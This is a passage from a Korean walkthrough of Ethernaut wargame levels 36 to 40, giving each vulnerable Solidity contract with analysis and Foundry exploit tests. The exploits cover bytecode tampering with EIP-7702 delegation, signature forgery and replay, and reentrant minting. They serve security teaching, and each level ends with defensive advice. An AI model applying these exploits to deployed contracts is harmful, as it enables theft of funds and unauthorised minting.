EIP-712 도메인·nonce·deadline을 서명에 포함한다.

### Level 36 — Cashback

#### 문제 설명과 목표

코드 검사와 nonce 조건을 우회한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Cashback.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "openzeppelin-contracts-v5.4.0/token/ERC20/IERC20.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";
import {ERC1155} from "openzeppelin-contracts-v5.4.0/token/ERC1155/ERC1155.sol";
import {TransientSlot} from "openzeppelin-contracts-v5.4.0/utils/TransientSlot.sol";

/*//////////////////////////////////////////////////////////////
                        CURRENCY LIBRARY
//////////////////////////////////////////////////////////////*/

type Currency is address;

using {equals as ==} for Currency global;
using CurrencyLibrary for Currency global;

function equals(Currency currency, Currency other) pure returns (bool) {
    return Currency.unwrap(currency) == Currency.unwrap(other);
}

library CurrencyLibrary {
    error NativeTransferFailed();
    error ERC20IsNotAContract();
    error ERC20TransferFailed();

    Currency public constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    function isNative(Currency currency) internal pure returns (bool) {
        return Currency.unwrap(currency) == Currency.unwrap(NATIVE_CURRENCY);
    }

    function transfer(Currency currency, address to, uint256 amount) internal {
        if (currency.isNative()) {
            (bool success,) = to.call{value: amount}("");
            require(success, NativeTransferFailed());
        } else {
            (bool success, bytes memory data) = Currency.unwrap(currency).call(abi.encodeCall(IERC20.transfer, (to, amount)));
            require(Currency.unwrap(currency).code.length != 0, ERC20IsNotAContract());
            require(success, ERC20TransferFailed());
            require(data.length == 0 || true == abi.decode(data, (bool)), ERC20TransferFailed());
        }
    }

    function toId(Currency currency) internal pure returns (uint256) {
        return uint160(Currency.unwrap(currency));
    }
}

/*//////////////////////////////////////////////////////////////
                       CASHBACK CONTRACT
//////////////////////////////////////////////////////////////*/

/// @dev keccak256(abi.encode(uint256(keccak256("Cashback")) - 1)) & ~bytes32(uint256(0xff))
contract Cashback is ERC1155 layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba00 {
    using TransientSlot for *;

    error CashbackNotCashback();
    error CashbackIsCashback();
    error CashbackNotAllowedInCashback();
    error CashbackOnlyAllowedInCashback();
    error CashbackNotDelegatedToCashback();
    error CashbackNotEOA();
    error CashbackNotUnlocked();
    error CashbackSuperCashbackNFTMintFailed();

    bytes32 internal constant UNLOCKED_TRANSIENT = keccak256("cashback.storage.Unlocked");
    uint256 internal constant BASIS_POINTS = 10000;
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    Cashback internal immutable CASHBACK_ACCOUNT = this;
    address public immutable superCashbackNFT;

    uint256 public nonce;
    mapping(Currency => uint256 Rate) public cashbackRates;
    mapping(Currency => uint256 MaxCashback) public maxCashback;

    modifier onlyCashback() {
        require(msg.sender == address(CASHBACK_ACCOUNT), CashbackNotCashback());
        _;
    }

    modifier onlyNotCashback() {
        require(msg.sender != address(CASHBACK_ACCOUNT), CashbackIsCashback());
        _;
    }

    modifier notOnCashback() {
        require(address(this) != address(CASHBACK_ACCOUNT), CashbackNotAllowedInCashback());
        _;
    }

    modifier onlyOnCashback() {
        require(address(this) == address(CASHBACK_ACCOUNT), CashbackOnlyAllowedInCashback());
        _;
    }

    modifier onlyDelegatedToCashback() {
        bytes memory code = msg.sender.code;

        address payable delegate;
        assembly {
            delegate := mload(add(code, 0x17))
        }
        require(Cashback(delegate) == CASHBACK_ACCOUNT, CashbackNotDelegatedToCashback());
        _;
    }

    modifier onlyEOA() {
        require(msg.sender == tx.origin, CashbackNotEOA());
        _;
    }

    modifier unlock() {
        UNLOCKED_TRANSIENT.asBoolean().tstore(true);
        _;
        UNLOCKED_TRANSIENT.asBoolean().tstore(false);
    }

    modifier onlyUnlocked() {
        require(Cashback(payable(msg.sender)).isUnlocked(), CashbackNotUnlocked());
        _;
    }

    receive() external payable onlyNotCashback {}

    constructor(
        address[] memory cashbackCurrencies,
        uint256[] memory currenciesCashbackRates,
        uint256[] memory currenciesMaxCashback,
        address _superCashbackNFT
    ) ERC1155("") {
        uint256 len = cashbackCurrencies.length;
        for (uint256 i = 0; i < len; i++) {
            cashbackRates[Currency.wrap(cashbackCurrencies[i])] = currenciesCashbackRates[i];
            maxCashback[Currency.wrap(cashbackCurrencies[i])] = currenciesMaxCashback[i];
        }

        superCashbackNFT = _superCashbackNFT;
    }

    // Implementation Functions
    function accrueCashback(Currency currency, uint256 amount) external onlyDelegatedToCashback onlyUnlocked onlyOnCashback{
        uint256 newNonce = Cashback(payable(msg.sender)).consumeNonce();
        uint256 cashback = (amount * cashbackRates[currency]) / BASIS_POINTS;

        if (cashback != 0) {
            uint256 _maxCashback = maxCashback[currency];
            if (balanceOf(msg.sender, currency.toId()) + cashback > _maxCashback) {
                cashback = _maxCashback - balanceOf(msg.sender, currency.toId());
            }

            uint256[] memory ids = new uint256[](1);
            ids[0] = currency.toId();
            uint256[] memory values = new uint256[](1);
            values[0] = cashback;
            _update(address(0), msg.sender, ids, values);
        }
        if (SUPERCASHBACK_NONCE == newNonce) {
            (bool success,) = superCashbackNFT.call(abi.encodeWithSignature("mint(address)", msg.sender));
            require(success, CashbackSuperCashbackNFTMintFailed());
        }
    }

    // Smart Account Functions
    function payWithCashback(Currency currency, address receiver, uint256 amount) external unlock onlyEOA notOnCashback {
        currency.transfer(receiver, amount);
        CASHBACK_ACCOUNT.accrueCashback(currency, amount);
    }

    function consumeNonce() external onlyCashback notOnCashback returns (uint256) {
        return ++nonce;
    }

    function isUnlocked() public view returns (bool) {
        return UNLOCKED_TRANSIENT.asBoolean().tload();
    }
}
```

</details>

#### 코드 분석

생성·런타임 바이트코드를 직접 변형한 공격 컨트랙트와 EIP-7702 위임을 함께 사용한다. 코드 자체를 검사하는 로직을 우회한 뒤 플레이어 EOA에 nonce 변경 코드를 위임해 보상 조건을 조작한다. `extcodehash`, 코드 prefix, EOA 가정만으로 신뢰를 정하면 안 된다.

#### 풀이 과정

1. runtime bytecode의 jump offset을 조정해 검사기를 우회하고 EIP-7702 위임으로 EOA nonce 상태를 바꾼다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player, player);
        
        // Creation bytecode prefix with code size modified
        //61 04 F4 // Push 0x04F4 (runtime code size)
        //80 // DUP1
        //60 0B // Push 0x0B (runtime code offset)
        //5f // Push 0
        //39 // CODECOPY Copy to memory at 0x00 the code starting at 0x0B of size 0x04F4
        //5f // PUSH0
        //f3 // RETURN
        //fe // INVALID
        bytes memory creationCodePrefix = hex"6104F480600B5F395FF3FE";

        // CashbackAttack Bytecode with jump opcodes modified to jump to the correct offsets
        bytes memory runtimeCodeJumpOffset =
            hex"6080604052348015610027575f5ffd5b5060043610610062575f3560e01c806334b151181461006657806349f426501461008157806366a79de0146100b45780638380edb7146100c9575b5f5ffd5b61006e6100d8565b6040519081526020015b60405180910390f35b61008473eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee81565b6040516001600160a01b039091168152602001610078565b6100c76100c23660046103e7565b6100fa565b005b60405160018152602001610078565b5f805460ff166100f557505f805460ff1916600117905561271090565b505f90565b60405163ebc3961360e01b815273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6004820152680ad78ebc5ac6200000602482015283906001600160a01b0386169063ebc39613906044015f604051808303815f87803b15801561015d575f5ffd5b505af115801561016f573d5f5f3e3d5ffd5b505060405163ebc3961360e01b81526001600160a01b03848116600483015269054b40b1f852bda0000060248301528816925063ebc3961391506044015f604051808303815f87803b1580156101c3575f5ffd5b505af11580156101d5573d5f5f3e3d5ffd5b5050604080517ff242432a0000000000000000000000000000000000000000000000000000000081523060048201526001600160a01b03868116602483015273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee6044830152670de0b6b3a7640000606483015260a060848301525f60a483018190529251908a16945063f242432a935060c4808301939282900301818387803b158015610274575f5ffd5b505af1158015610286573d5f5f3e3d5ffd5b50505050846001600160a01b031663f242432a30846102b4856001600160a01b03166001600160a01b031690565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e086901b1681526001600160a01b0393841660048201529290911660248301526044820152681b1ae4d6e2ef500000606482015260a060848201525f60a482015260c4015f604051808303815f87803b158015610334575f5ffd5b505af1158015610346573d5f5f3e3d5ffd5b50506040517f23b872dd00000000000000000000000000000000000000000000000000000000815230600482018190526001600160a01b0386811660248401526044830191909152861692506323b872dd91506064015f604051808303815f87803b1580156103b3575f5ffd5b505af11580156103c5573d5f5f3e3d5ffd5b505050505050505050565b6001600160a01b03811681146103e4575f5ffd5b50565b5f5f5f5f608085870312156103fa575f5ffd5b8435610405816103d0565b93506020850135610415816103d0565b92506040850135610425816103d0565b91506060850135610435816103d0565b93969295509093505056fea26469706673582212202e0d76d852d9edd94717178973a78702f6bc3071a7ae373162c114f2104e014d64736f6c634300081e0033";

        // Tampered runtime bytecode
        // 60 17 Push 0x17
        // 56 JUMP to 0x17
        // instance Address
        // 5B JUMPDEST
        // type(CashbackAttack).runtimeCode with offset applied to jump instructions
        bytes memory runtimeCodeTampered =
            bytes.concat(hex"601756", abi.encodePacked(instance), hex"5B", runtimeCodeJumpOffset);

        // Deploy the tampered attack contract using a factory
        CashbackAttackBytecodeDeployer deployer = new CashbackAttackBytecodeDeployer();
        CashbackAttack attackContract =
            CashbackAttack(deployer.deployFromBytecode(bytes.concat(creationCodePrefix, runtimeCodeTampered)));

        // Execute attack pahse 1
        attackContract.attack(instance, factory.FREE(), SuperCashbackNFT(instance.superCashbackNFT()), player);

        // Execute attack phase 2
        CashbackAttackNonceSetter nonceSetter = new CashbackAttackNonceSetter();
        vm.signAndAttachDelegation(address(nonceSetter), playerKey);
        CashbackAttackNonceSetter(payable(address(player))).setNonce(9999);

        vm.signAndAttachDelegation(address(instance), playerKey);
        Cashback(payable(address(player))).payWithCashback(
            Currency.wrap(address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)), player, 1
        );

        // Check level completion
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 36 Cashback 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-36-cashback.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

코드 형태나 EOA 여부를 신뢰의 근거로 쓰지 않는다.

### Level 37 — Impersonator Two

#### 문제 설명과 목표

admin과 lock 서명 검증을 모두 우회한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>ImpersonatorTwo.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Ownable} from "openzeppelin-contracts-08/access/Ownable.sol";
import {ECDSA} from "openzeppelin-contracts-08/utils/cryptography/ECDSA.sol";
import {Strings} from "openzeppelin-contracts-08/utils/Strings.sol";

contract ImpersonatorTwo is Ownable {
    using Strings for uint256;

    error NotAdmin();
    error InvalidSignature();
    error FundsLocked();

    address public admin;
    uint256 public nonce;
    bool locked;

    constructor() payable {}

    modifier onlyAdmin() {
        require(msg.sender == admin, NotAdmin());
        _;
    }

    function setAdmin(bytes memory signature, address newAdmin) public {
        string memory message = string(abi.encodePacked("admin", nonce.toString(), newAdmin));
        require(_verify(hash_message(message), signature), InvalidSignature());
        nonce++;
        admin = newAdmin;
    }

    function switchLock(bytes memory signature) public {
        string memory message = string(abi.encodePacked("lock", nonce.toString()));
        require(_verify(hash_message(message), signature), InvalidSignature());
        nonce++;
        locked = !locked;
    }

    function withdraw() public onlyAdmin {
        require(!locked, FundsLocked());
        payable(admin).transfer(address(this).balance);
    }

    function hash_message(string memory message) public pure returns (bytes32) {
        return ECDSA.toEthSignedMessageHash(abi.encodePacked(message));
    }

    function _verify(bytes32 hash, bytes memory signature) internal view returns (bool) {
        return ECDSA.recover(hash, signature) == owner();
    }
}
```

</details>

#### 코드 분석

서명 검증에 함수 목적과 상태를 구분하는 도메인이 충분히 결합되지 않았다. 같은 `r`을 갖도록 만든 두 서명으로 `setAdmin()`과 `switchLock()`을 통과하고 `withdraw()`한다. 한 서명이 다른 기능이나 컨트랙트에서 재사용되지 않도록 EIP-712 domain과 함수별 nonce를 사용해야 한다.

#### 풀이 과정

1. 도메인 분리가 약한 두 검증에 맞춘 서명으로 admin 설정, lock 해제, withdraw를 차례로 호출한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        // Signatures generated with ImpersonatorTwo.py script
        bytes memory setAdminSig = abi.encodePacked(
            hex"e5648161e95dbf2bfc687b72b745269fa906031e2108118050aba59524a23c40", // r
            hex"701d59ccb1c72824452441d95444aa250ef592082f0f81957de7c9a7b5c14553", // s
            uint8(28) // v
        );
        bytes memory switchLockSig = abi.encodePacked(
            hex"e5648161e95dbf2bfc687b72b745269fa906031e2108118050aba59524a23c40", // r
            hex"2a04aa67c7760a7bec982fde4b387e1e62dc26ba69dd74444e68ffe28851375e", // s
            uint8(28) // v
        );

        instance.setAdmin(setAdminSig, player);
        instance.switchLock(switchLockSig);
        instance.withdraw();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 37 Impersonator Two 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-37-impersonator-two.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

기능별 nonce와 EIP-712 type/domain을 분리한다.

## 8. Level 38–40: EIP-7702와 최신 공격 표면

### Level 38 — UniqueNFT

#### 문제 설명과 목표

한 EOA가 NFT를 두 개 이상 갖게 한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>UniqueNFT.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { ERC721 } from "openzeppelin-contracts-v5.4.0/token/ERC721/ERC721.sol";
import { ERC721Utils } from "openzeppelin-contracts-v5.4.0/token/ERC721/utils/ERC721Utils.sol";
import { ReentrancyGuard } from "openzeppelin-contracts-v5.4.0/utils/ReentrancyGuard.sol";

contract UniqueNFT is ERC721, ReentrancyGuard {

    uint256 public tokenId;

    constructor() ERC721("UniqueNFT", "UNFT") {}

    /// @notice Function to mint NFTs for smart contracts only
    /// @notice Smart contracts need to pay a fee to mint the NFT
    /// @dev Has reentrancy protection just in case the smart contract would try to do some bad stuff
    function mintNFTSmartContract() external payable nonReentrant returns(uint256 mintedNFT) {
        require(msg.value == 1 ether, "fee not sent");
        mintedNFT = _mintNFT();
    }

    /// @notice Function to mint NFTs for EOAs only
    /// @notice EOAs are exempt from minting the NFT
    function mintNFTEOA() external returns(uint256 mintedNFT) {
        require(tx.origin == msg.sender, "not an EOA");
        mintedNFT = _mintNFT();
    }

    function _mintNFT() private returns(uint256) {
        require(balanceOf(msg.sender) == 0, "only one unique NFT allowed");
        uint256 _tokenId = tokenId++;
        ERC721Utils.checkOnERC721Received(address(0), address(0), msg.sender, _tokenId, "");
        _mint(msg.sender, _tokenId);
        return _tokenId;
    }

    function _update(address to, uint256 _tokenId, address auth) internal override returns (address) {
        address from = super._update(to, _tokenId, auth);
        require(from == address(0), "transfers not allowed");
        return from;
    }
}
```

</details>

#### 코드 분석

목표는 한 주소가 NFT를 두 개 이상 갖게 만드는 것이다. 컨트랙트는 `tx.origin == msg.sender`면 EOA라고 믿고 무료 민팅을 허용한다. 하지만 EIP-7702로 EOA 주소에 실행 코드를 위임하면 조건은 여전히 참이면서 ERC-721 수신 콜백도 실행된다.

```solidity
function onERC721Received(...) external returns (bytes4) {
    if (target.tokenId() < 2) target.mintNFTEOA();
    return IERC721Receiver.onERC721Received.selector;
}
```

`_mintNFT()`는 tokenId를 증가시킨 뒤 `_mint()`보다 먼저 `checkOnERC721Received()`를 호출한다. 위임 EOA의 콜백에서 `mintNFTEOA()`를 재호출하면 아직 `balanceOf(player) == 0`이므로 두 개가 민팅된다. 별도 Foundry 테스트에서 최종 balance 2와 factory 검증 true를 확인했다.

#### 풀이 과정

1. EIP-7702로 플레이어 EOA에 ERC721Receiver 코드를 위임하고 수신 콜백에서 mintNFTEOA를 재진입한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolveWithEIP7702() public {
        uint256 playerKey = 0xA11CE;
        address player = vm.addr(playerKey);
        UniqueNFT target = new UniqueNFT();
        DelegatedMinter implementation = new DelegatedMinter(target);

        vm.signAndAttachDelegation(address(implementation), playerKey);
        vm.prank(player, player);
        target.mintNFTEOA();

        assertEq(target.balanceOf(player), 2);
        assertTrue(new UniqueNFTFactory().validateInstance(payable(address(target)), player));
    }
```

#### 풀이 완료 확인

![Level 38 UniqueNFT 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-38-uniquenft.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

tx.origin과 code.length로 EOA를 판별하지 않는다.

### Level 39 — Forger

#### 문제 설명과 목표

같은 owner 서명으로 100 FT를 두 번 민팅한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Forger.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { ERC20 } from "openzeppelin-contracts-v4.6.0/token/ERC20/ERC20.sol";
import { ECDSA } from "openzeppelin-contracts-v4.6.0/utils/cryptography/ECDSA.sol";

contract Forger is ERC20 {

    error SignatureExpired();
    error SignatureUsed();
    error InvalidSigner(address wrongSigner);
    error OnlyOwner();

    address public owner = 0xC9CAF9e17BBb4e4D27810d97d2C2a467A701e0D5;
    mapping(bytes32 signatureHash => bool used) public signatureUsed;

    constructor() ERC20("Forger Token", "FT") {}

    // It seems like the owner has already signed a mint of tokens for someone:
    // signature = f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c
    // amount = 100 ether
    // receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e
    // salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d
    // deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935
    function createNewTokensFromOwnerSignature(
        bytes calldata signature,
        address receiver,
        uint256 amount,
        bytes32 salt,           
        uint256 deadline      
    ) public {
        require(block.timestamp <= deadline, SignatureExpired());
        require(!signatureUsed[keccak256(signature)], SignatureUsed());

        bytes32 messageHash = keccak256(abi.encode(
            receiver,
            amount,
            salt,
            deadline
        ));

        address signer = ECDSA.recover(messageHash, signature);

        require(signer == owner, InvalidSigner(signer));

        signatureUsed[keccak256(signature)] = true;

        _mint(receiver, amount);
    }

    function invalidateSignature(bytes calldata signature) external {
        require(msg.sender == owner, OnlyOwner());
        signatureUsed[keccak256(signature)] = true;
    }
}
```

</details>

#### 코드 분석

컨트랙트는 `keccak256(signature bytes)`만 사용 여부로 기록한다. 공개된 65바이트 `(r,s,v)` 서명을 한 번 쓴 뒤, 동일한 서명을 EIP-2098의 64바이트 `(r, yParityAndS)`로 압축한다. OpenZeppelin `ECDSA.recover`는 두 표현을 같은 signer로 복구하지만 raw bytes의 해시는 달라 두 번째 사용이 허용된다.

```solidity
bytes32 yParityAndS = bytes32(uint256(s) | (uint256(v - 27) << 255));
bytes memory compact = abi.encodePacked(r, yParityAndS);
```

별도 테스트에서 100 FT를 두 번 민팅해 totalSupply가 200 ether가 되는 것을 확인했다. 방어는 서명 바이트가 아니라 메시지 nonce 또는 digest의 사용 여부를 기록하는 것이다.

#### 풀이 과정

1. 65바이트 서명을 먼저 사용하고 같은 서명을 EIP-2098 64바이트 형식으로 바꿔 raw signature hash replay 방지를 우회한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolveWithCompactSignatureReplay() public {
        Forger target = new Forger();
        bytes memory signature = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";
        address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
        uint256 amount = 100 ether;
        bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
        uint256 deadline = type(uint256).max;

        target.createNewTokensFromOwnerSignature(signature, receiver, amount, salt, deadline);

        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        bytes32 yParityAndS = bytes32(uint256(s) | (uint256(v - 27) << 255));
        bytes memory compact = abi.encodePacked(r, yParityAndS);
        target.createNewTokensFromOwnerSignature(compact, receiver, amount, salt, deadline);

        assertEq(target.totalSupply(), 200 ether);
        assertTrue(new ForgerFactory().validateInstance(payable(address(target)), receiver));
    }
```

#### 풀이 완료 확인

![Level 39 Forger 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-39-forger.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

서명 bytes가 아니라 message digest와 nonce의 사용 여부를 기록한다.

### Level 40 — NotOptimisticPortal

#### 문제 설명과 목표

proof 검증을 우회해 portal 토큰을 민팅한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>NotOptimisticPortal.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// https://github.com/ethereum-optimism/optimism/blob/@eth-optimism/contracts@0.6.0/packages/contracts/contracts/libraries/rlp/Lib_RLPReader.sol
import { Lib_RLPReader } from "../helpers/lib/rlp/Lib_RLPReader.sol";
// https://github.com/ethereum-optimism/optimism/blob/@eth-optimism/contracts@0.6.0/packages/contracts/contracts/libraries/trie/Lib_SecureMerkleTrie.sol
import { Lib_SecureMerkleTrie } from "../helpers/lib/trie/Lib_SecureMerkleTrie.sol";
import { ReentrancyGuard } from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IMessageReceiver {
    function onMessageReceived(bytes memory messageData) external;
}

contract NotOptimisticPortal is ERC20, ReentrancyGuard{
    using Lib_RLPReader for bytes;
    using Lib_RLPReader for Lib_RLPReader.RLPItem;

    struct ProofData {
        bytes stateTrieProof;
        bytes storageTrieProof;
        bytes accountStateRlp;
    }

    address public constant L2_TARGET = 0x4242424242424242424242424242424242424242;
    uint16 public constant MAX_ROOT_BUFFER = 1000;

    // Shared data
    address public owner;
    address public sequencer;
    address public immutable governance;

    // L2 state data
    bytes32 public latestBlockHash;
    uint256 public latestBlockNumber;
    uint256 public latestBlockTimestamp;
    bytes32[MAX_ROOT_BUFFER] public l2StateRoots;
    uint16 public bufferCounter;
    mapping(bytes32 => bool) public executedMessages;

    event MessageExecuted(
        address indexed to,
        uint256 indexed amount,
        address[] targetAddresses,
        bytes[] executionDatas,
        uint256 salt
    );

    constructor(
        string memory _name,
        string memory _symbol,
        bytes memory _rlpBlockHeader, 
        address _governance
    ) ERC20(_name, _symbol) {
        owner = msg.sender;
        (bytes32 parentHash, bytes32 stateRoot, uint256 blockNumber, uint256 timestamp) = _extractData(_rlpBlockHeader);
        _updateL2State(keccak256(_rlpBlockHeader), parentHash, stateRoot, blockNumber, timestamp);
        governance = _governance;
    }

    function executeMessage(
        address _tokenReceiver,
        uint256 _amount,
        address[] calldata _messageReceivers,
        bytes[] calldata _messageData,
        uint256 _salt,
        ProofData calldata _proofs,
        uint16 _bufferIndex
    ) external nonReentrant {
        bytes32 withdrawalHash = _computeMessageSlot(
            _tokenReceiver,
            _amount,
            _messageReceivers,
            _messageData,
            _salt
        );
        require(!executedMessages[withdrawalHash], "Message already executed");
        require(_messageReceivers.length == _messageData.length, "Message execution data arrays mismatch");

        for(uint256 i; i < _messageData.length; i++){
            _executeOperation(_messageReceivers[i], _messageData[i], false);
        }

        _verifyMessageInclusion(
            withdrawalHash,
            _proofs.stateTrieProof,
            _proofs.storageTrieProof,
            _proofs.accountStateRlp,
            _bufferIndex
        );

        executedMessages[withdrawalHash] = true;

        if(_amount != 0){
            _mint(_tokenReceiver, _amount);
        }
        emit MessageExecuted(
            _tokenReceiver,
            _amount,
            _messageReceivers,
            _messageData,
            _salt
        );
    }

    function sendMessage(
        uint256 _amount,
        address[] calldata _messageReceivers,
        bytes[] calldata _messageData,
        uint256 _salt
    ) external {
        require(_messageReceivers.length == _messageData.length, "Message array mismatch");
        for(uint256 i; i < _messageData.length; i++){
            require(bytes4(_messageData[i][0:4]) == bytes4(0x3a69197e), "Message not allowed");
        }
        bytes32 storageSlot = _computeMessageSlot(
            msg.sender,
            _amount,
            _messageReceivers,
            _messageData,
            _salt
        );
        uint256 slotValue;
        assembly{
            slotValue := sload(storageSlot)
        }
        require(slotValue == 0, "Message already sent");
        assembly{
            sstore(storageSlot, 0x01)
        }
        _burn(msg.sender, _amount);
    }



    // Permissioned function (optimized to be at the end of the function selector dispatching)
    function submitNewBlock_____37278985983(bytes memory rlpBlockHeader) external onlySequencer {
        (bytes32 parentHash, bytes32 stateRoot, uint256 blockNumber, uint256 timestamp) = _extractData(rlpBlockHeader);
        _updateL2State(keccak256(rlpBlockHeader), parentHash, stateRoot, blockNumber, timestamp);
    }

    function updateSequencer_____76439298743(address newSequencer) external onlyOwner {
        sequencer = newSequencer;
    }

    function transferOwnership_____610165642(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    function governanceAction_____2357862414(address target, bytes calldata callData) external onlyGovernance {
        _executeOperation(target, callData, true);
    }

    // Governance must be able to transfer portal ownership
    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == address(this), "Caller not owner");
        _;
    }

    modifier onlySequencer() {
        require(msg.sender == sequencer, "Caller not sequencer");
        _;
    }

    modifier onlyGovernance() {
        require(msg.sender == governance, "Caller not governance");
        _;
    }


    // Internal functions
    function _computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] calldata _messageReceivers,
        bytes[] calldata _messageDatas,
        uint256 _salt
    ) internal pure returns(bytes32){
        bytes32 messageReceiversAccumulatedHash;
        bytes32 messageDatasAccumulatedHash;
        if(_messageReceivers.length != 0){
            for(uint i; i < _messageReceivers.length - 1; i++){
                messageReceiversAccumulatedHash = keccak256(abi.encode(messageReceiversAccumulatedHash, _messageReceivers[i]));
                messageDatasAccumulatedHash = keccak256(abi.encode(messageDatasAccumulatedHash, _messageDatas[i]));
            }
        }
        return keccak256(abi.encode(
            _tokenReceiver,
            _amount,
            messageReceiversAccumulatedHash,
            messageDatasAccumulatedHash,
            _salt
        ));
    }

    function _extractData(bytes memory rlpBlockHeader) internal pure
        returns(
            bytes32 parentHash,
            bytes32 stateRoot,
            uint256 number,
            uint256 timestamp
        ){
            Lib_RLPReader.RLPItem[] memory header = rlpBlockHeader.toRLPItem().readList();

            parentHash = bytes32(header[0].readUint256());
            stateRoot = bytes32(header[3].readUint256());
            number = header[8].readUint256();
            timestamp = header[11].readUint256();
    }

    function _verifyMessageInclusion(
        bytes32 messageSlot,
        bytes calldata stateTrieProof,
        bytes calldata storageTrieProof,
        bytes calldata accountStateRlp,
        uint16 bufferIndex
    ) internal view {
        // Verify L2_TARGET in state root
        bool accountVerified = Lib_SecureMerkleTrie.verifyInclusionProof(
            abi.encodePacked(L2_TARGET),
            accountStateRlp,
            stateTrieProof,
            l2StateRoots[bufferIndex]
        );
        require(accountVerified, "Invalid account proof");

        // Extract storageRoot
        Lib_RLPReader.RLPItem[] memory accountState = accountStateRlp.toRLPItem().readList();
        
        // Account state is [nonce, balance, storageRoot, codeHash]
        bytes32 storageRoot = accountState[2].readBytes32();

        // Verify message slot in storage root
        bool slotVerified = Lib_SecureMerkleTrie.verifyInclusionProof(
            abi.encodePacked(messageSlot),
            hex"01",
            storageTrieProof,
            storageRoot
        );
        require(slotVerified, "Invalid storage proof");
    }

    function _updateL2State(
        bytes32 newBlockHash,
        bytes32 parentBlockHash,
        bytes32 newRootState,
        uint256 newBlockNumber,
        uint256 newTimestamp
    ) internal {
        if(latestBlockHash != 0) require(parentBlockHash == latestBlockHash, "Invalid parent block hash");
        if(latestBlockNumber != 0) require(newBlockNumber == latestBlockNumber + 1, "Invalid block number");
        require(newTimestamp > latestBlockTimestamp, "Invalid timestamp");

        latestBlockHash = newBlockHash;
        l2StateRoots[bufferCounter] = newRootState;
        bufferCounter = (bufferCounter + 1) % 1000;
        latestBlockNumber = newBlockNumber;
        latestBlockTimestamp = newTimestamp;
    }

    function _executeOperation(
        address target,
        bytes calldata callData,
        bool isGovernanceAction
    ) internal {
        if(!isGovernanceAction){
            // Ensure the execution is the onMessageReceived(bytes) entrypoint on the target address
            require(bytes4(callData[0:4]) == bytes4(0x3a69197e), "Invalid message entrypoint");
        }
        (bool success, ) = target.call(callData);
        require(success, "Execution failed");
    }
}
```

</details>

#### 코드 분석

가장 복잡한 마지막 문제다. 취약점은 세 가지가 결합된다.

1. `executeMessage()`가 Merkle proof 검증보다 외부 메시지를 먼저 실행한다.
2. `_computeMessageSlot()` 루프가 `length - 1`까지만 돌아 마지막 receiver/data를 해시에 넣지 않는다.
3. `transferOwnership_____610165642(address)`의 selector가 허용 진입점 `onMessageReceived(bytes)`의 `0x3a69197e`와 충돌한다.

